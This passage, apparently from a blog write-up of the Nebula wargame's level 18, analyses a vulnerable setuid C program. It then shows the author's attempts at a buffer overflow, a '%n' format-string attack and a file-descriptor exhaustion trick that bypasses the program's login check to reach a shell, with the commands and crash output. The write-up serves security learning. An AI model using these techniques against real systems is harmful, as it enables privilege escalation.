  &lt;span style=&#34;color: #66d9ef&#34;&gt;while&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;((c&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;getopt(argc,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;d:v&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;switch&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(c)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
      &lt;span style=&#34;color: #66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;d&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;globals.debugfile&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;fopen(optarg,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;w+&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(globals.debugfile&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;NULL)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;err(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Unable to open %s&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;optarg);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;setvbuf(globals.debugfile,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;NULL,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;_IONBF,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;break&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
      &lt;span style=&#34;color: #66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;v&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;globals.verbose&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;break&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;dprintf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Starting up. Verbose level = %d&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;globals.verbose);&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;setresgid(getegid(),&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;getegid(),&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;getegid());&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;setresuid(geteuid(),&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;geteuid(),&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;geteuid());&lt;/span&gt;
  
  &lt;span style=&#34;color: #66d9ef&#34;&gt;while&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;line[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;256&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;p,&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;q;&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;q&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;fgets(line,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(line)&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;stdin);&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(q&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;NULL)&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;break&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;strchr(line,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(p)&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;strchr(line,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;\r&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(p)&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;dvprintf(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;got [%s] as input&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;line);&lt;/span&gt;

    &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(strncmp(line,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;login&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;dvprintf(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;attempting to login&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;login(line&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(strncmp(line,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;logout&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;globals.loggedin&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(strncmp(line,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;shell&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;dvprintf(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;attempting to start shell&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
      &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(globals.loggedin)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;execve(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;envp);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;err(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;unable to execve&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;dprintf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Permission denied&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(strncmp(line,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;logout&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;globals.loggedin&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(strncmp(line,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;closelog&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
      &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(globals.debugfile)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;fclose(globals.debugfile);&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;globals.debugfile&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;NULL;&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(strncmp(line,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;site exec&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;9&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;notsupported(line&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(strncmp(line,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;setuser&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;setuser(line&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

  &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;This is quite a lot a of code, but let&amp;rsquo;s see what it does. The program accepts
two arguments &lt;code&gt;-v&lt;/code&gt; and &lt;code&gt;-d&lt;/code&gt; which increase verbosity level and set a debug file
respectively. If you launch it with &lt;code&gt;flag18 -v -v -v -d /tmp/debug&lt;/code&gt; and then
&lt;code&gt;tail -f /tmp/debug&lt;/code&gt; you can see what&amp;rsquo;s going on. I used 3 &lt;code&gt;-v&lt;/code&gt; because that&amp;rsquo;s
the max debug level to be sure to capture everything.&lt;/p&gt;

&lt;p&gt;Once it&amp;rsquo;s running there&amp;rsquo;s a number of commands we can issue. These are probably
going to give us something to poke around with. We can try to get a shell with
the &lt;em&gt;shell&lt;/em&gt; command, but that means we need to be logged in. I&amp;rsquo;ll make a
note of that. The &lt;code&gt;setuser&lt;/code&gt; function has a fixed sized buffer. Let&amp;rsquo;s try to
overflow that&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level18@nebula:/home/flag18$ python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print(&amp;#39;setuser &amp;#39; + &amp;#39;A&amp;#39;*128)&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; ./flag18 -v -v -v -d /tmp/flag18/debug
*** buffer overflow detected ***: ./flag18 terminated
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x45)[0x6998d5]
/lib/i386-linux-gnu/libc.so.6(+0xe66d7)[0x6986d7]
/lib/i386-linux-gnu/libc.so.6(+0xe5d35)[0x697d35]
/lib/i386-linux-gnu/libc.so.6(_IO_default_xsputn+0x91)[0x61df91]
/lib/i386-linux-gnu/libc.so.6(_IO_vfprintf+0x31d5)[0x5f5305]
/lib/i386-linux-gnu/libc.so.6(__vsprintf_chk+0xc9)[0x697e09]
/lib/i386-linux-gnu/libc.so.6(__sprintf_chk+0x2f)[0x697d1f]
./flag18[0x8048df5]
./flag18[0x8048b1b]
/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0x5cb113]
./flag18[0x8048bb1]
======= Memory map: ========
005b2000-00728000 r-xp 00000000 07:00 44973      /lib/i386-linux-gnu/libc-2.13.so
00728000-0072a000 r--p 00176000 07:00 44973      /lib/i386-linux-gnu/libc-2.13.so
0072a000-0072b000 rw-p 00178000 07:00 44973      /lib/i386-linux-gnu/libc-2.13.so
0072b000-0072e000 rw-p 00000000 00:00 0
0079b000-007b9000 r-xp 00000000 07:00 44978      /lib/i386-linux-gnu/ld-2.13.so
007b9000-007ba000 r--p 0001d000 07:00 44978      /lib/i386-linux-gnu/ld-2.13.so
007ba000-007bb000 rw-p 0001e000 07:00 44978      /lib/i386-linux-gnu/ld-2.13.so
007fd000-007fe000 r-xp 00000000 00:00 0          [vdso]
00886000-008a2000 r-xp 00000000 07:00 45092      /lib/i386-linux-gnu/libgcc_s.so.1
008a2000-008a3000 r--p 0001b000 07:00 45092      /lib/i386-linux-gnu/libgcc_s.so.1
008a3000-008a4000 rw-p 0001c000 07:00 45092      /lib/i386-linux-gnu/libgcc_s.so.1
08048000-0804a000 r-xp 00000000 07:00 12922      /home/flag18/flag18
0804a000-0804b000 r--p 00001000 07:00 12922      /home/flag18/flag18
0804b000-0804c000 rw-p 00002000 07:00 12922      /home/flag18/flag18
099f9000-09a1a000 rw-p 00000000 00:00 0          [heap]
b7832000-b7833000 rw-p 00000000 00:00 0
b783b000-b783e000 rw-p 00000000 00:00 0
bf8bf000-bf8e0000 rw-p 00000000 00:00 0          [stack]
Aborted
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;This led me to learn about &lt;a href=&#34;https://en.wikipedia.org/wiki/Stack_canary#Stack_canaries&#34;&gt;stack canaries&lt;/a&gt;, and with this we&amp;rsquo;re out of luck
(for a simple solution). This means the code has been compiled with
&lt;em&gt;FORTIFY_SOURCE&lt;/em&gt; and this also going to prevent string formatting exploits in
the &lt;code&gt;notsupported&lt;/code&gt; function.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level18@nebula:/home/flag18$ ./flag18 -v -v -v -d /tmp/flag18/debug
site exec %n
*** %n in writable segment detected ***
Aborted
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Yup. In the process of researching this I also discovered a neat tool called
&lt;a href=&#34;http://trapkit.de/tools/checksec.html&#34;&gt;checksec.sh&lt;/a&gt; that can help identify these compiler options early on.&lt;/p&gt;

&lt;p&gt;So what have we got left? The function that checks the password file. If it&amp;rsquo;s
not actually able to find the password file, it will log us in. Unfortunately
we&amp;rsquo;re not able to delete it. However we can make the &lt;code&gt;fopen&lt;/code&gt; call fail another
way. This error has happened a lot at work where we often deal with a lot of
files being open on a single system. Linux systems have a limit as to how
many filedescriptors it can have open at any one time. Because
the tool doesn&amp;rsquo;t close the file descriptors until you call &lt;code&gt;closelog&lt;/code&gt;,
we can just keep opening files until we hit the limit. Let&amp;rsquo;s see what that
limit is.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level18@nebula:/home/flag18$ &lt;span style=&#34;color: #f8f8f2&#34;&gt;ulimit&lt;/span&gt; -a
core file size          (blocks, -c) 0
data seg size           (kbytes, -d) unlimited
scheduling priority             (-e) 0
file size               (blocks, -f) unlimited
pending signals                 (-i) 1817
max locked memory       (kbytes, -l) 64
max memory size         (kbytes, -m) unlimited
open files                      (-n) 1024
pipe size            (512 bytes, -p) 8
POSIX message queues     (bytes, -q) 819200
real-time priority              (-r) 0
stack size              (kbytes, -s) 8192
cpu time               (seconds, -t) unlimited
max user processes              (-u) 1817
virtual memory          (kbytes, -v) unlimited
file locks                      (-x) unlimited
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;&lt;em&gt;1024&lt;/em&gt; is the limit. So let&amp;rsquo;s open 1024 files and see what happens. As we have
a few file descriptors open already we just need to open 1021 more.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level18@nebula:/home/flag18$ python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print(&amp;#39;login me\n&amp;#39;*1021 + &amp;#39;shell&amp;#39;)&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; ./flag18 -v -d /tmp/flag18/debug
./flag18: error while loading shared libraries: libncurses.so.5: cannot open shared object file: Error 24
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Ah, so many file descriptors we can&amp;rsquo;t open any more, not even to shared libraries.
We can close one and see how that goes.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level18@nebula:/home/flag18$ python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print(&amp;#39;login me\n&amp;#39;*1021 + &amp;#39;closelog\n&amp;#39; + &amp;#39;shell&amp;#39;)&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; ./flag18 -v -d /tmp/flag18/debug
./flag18: -d: invalid option
Usage:	./flag18 [GNU long option] [option] ...
	./flag18 [GNU long option] [option] script-file ...
GNU long options:
	--debug
	--debugger
	--dump-po-strings
	--dump-strings
	--help
	--init-file
	--login
